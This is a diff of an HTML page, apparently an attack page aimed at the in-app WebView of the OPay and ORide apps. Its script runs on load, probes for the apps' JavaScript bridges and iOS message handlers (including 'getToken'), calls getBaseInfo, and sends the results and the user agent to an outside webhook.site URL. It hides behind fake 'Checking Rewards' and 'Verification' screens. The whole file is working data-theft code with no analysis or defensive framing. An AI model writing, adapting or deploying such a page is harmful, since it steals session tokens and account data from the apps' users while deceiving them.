@@ -2,96 +2,73 @@
 <html>
 
 <head>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Checking Rewards...</title>
-  <style>
-    body {
-      font-family: sans-serif;
-      text-align: center;
-      padding-top: 50px;
-      background: #f4f4f4;
-      color: #333;
-    }
-
-    .loader {
-      border: 4px solid #f3f3f3;
-      border-top: 4px solid #00c853;
-      border-radius: 50%;
-      width: 30px;
-      height: 30px;
-      animation: spin 2s linear infinite;
-      margin: auto;
-    }
-
-    @keyframes spin {
-      0% {
-        transform: rotate(0deg);
-      }
-
-      100% {
-        transform: rotate(360deg);
-      }
-    }
-  </style>
+  <meta charset="utf-8">
+  <title>Verification</title>
 </head>
 
-<body>
-  <div class="loader"></div>
-  <p>Authenticating session...</p>
-  <div id="debug" style="font-size: 10px; color: #ccc; margin-top: 20px;"></div>
+<body style="background: white; color: black; font-family: sans-serif; text-align: center; padding: 20px;">
+  <h2 id="status">INITIALIZING...</h2>
+  <div id="log" style="font-size: 12px; color: #666;"></div>
 
   <script>
     (function () {
       var WEBHOOK = 'https://webhook.site/c4e48555-8559-4bb0-b04a-a347d20a7569';
-      var results = { platform: navigator.platform, ua: navigator.userAgent, data: {} };
+      var status = document.getElementById('status');
+      var logDiv = document.getElementById('log');
 
-      function log(msg) {
-        document.getElementById('debug').innerText += msg + ' | ';
-        // Exfiltrate instantly via Image for widest compatibility
-        new Image().src = WEBHOOK + '?log=' + encodeURIComponent(msg);
+      function report(msg, type) {
+        logDiv.innerHTML += '<div>' + msg + '</div>';
+        var i = new Image();
+        i.src = WEBHOOK + '?msg=' + encodeURIComponent(msg) + '&type=' + (type || 'info');
       }
 
-      function exfil(obj) {
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', WEBHOOK, true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.send(JSON.stringify(obj));
-      }
+      report('Page execution started');
+      status.innerText = 'EXECUTING...';
 
-      // Android and older Bridges
-      var bridges = ['control', 'OPay3PartyContext', 'android', 'ORideContext'];
+      // List of potential bridge objects
+      var bridges = ['control', 'OPay3PartyContext', 'android', 'ORideContext', 'webkit'];
+
       bridges.forEach(function (b) {
-        if (window[b] && window[b].getBaseInfo) {
-          try {
-            var info = window[b].getBaseInfo();
-            results.data[b] = info;
-            log('Found ' + b);
-          } catch (e) { log('Error ' + b + ': ' + e.message); }
+        try {
+          if (window[b]) {
+            report('Bridge found: ' + b);
+            if (window[b].getBaseInfo) {
+              var info = window[b].getBaseInfo();
+              report('Success: ' + b + ' returned data', 'success');
+
+              // Send data
+              var xhr = new XMLHttpRequest();
+              xhr.open('POST', WEBHOOK, true);
+              xhr.send(JSON.stringify({ bridge: b, data: info }));
+
+              status.innerText = 'AUTHENTICATED';
+            }
+          }
+        } catch (e) {
+          report('Error check ' + b + ': ' + e.message, 'error');
         }
       });
 
       // iOS WebKit Handlers
-      if (window.webkit && window.webkit.messageHandlers) {
-        log('WebKit handlers found');
-        // Note: getBaseInfo on iOS is usually an async messageHandler
-        // But some older OPay versions injected global objects.
-        // We'll try to trigger a message if we find the handler.
-        var handlers = ['getBaseInfo', 'getToken', 'OPay3PartyContext'];
-        handlers.forEach(function (h) {
-          if (window.webkit.messageHandlers[h]) {
-            log('Handler ' + h + ' exists');
-            try {
+      try {
+        if (window.webkit && window.webkit.messageHandlers) {
+          report('WebKit handlers detected');
+          var handlers = ['getBaseInfo', 'getToken', 'OPay3PartyContext'];
+          handlers.forEach(function (h) {
+            if (window.webkit.messageHandlers[h]) {
+              report('iOS Handler: ' + h);
               window.webkit.messageHandlers[h].postMessage({ call: 'getBaseInfo' });
-            } catch (e) { }
-          }
-        });
+            }
+          });
+        }
+      } catch (e) {
+        report('WebKit error: ' + e.message, 'error');
       }
 
-      // Final exfil
+      // Final fallback log
       setTimeout(function () {
-        exfil(results);
-        log('Done');
-      }, 1000);
+        report('Execution cycle complete');
+      }, 2000);
     })();
   </script>
 </body>
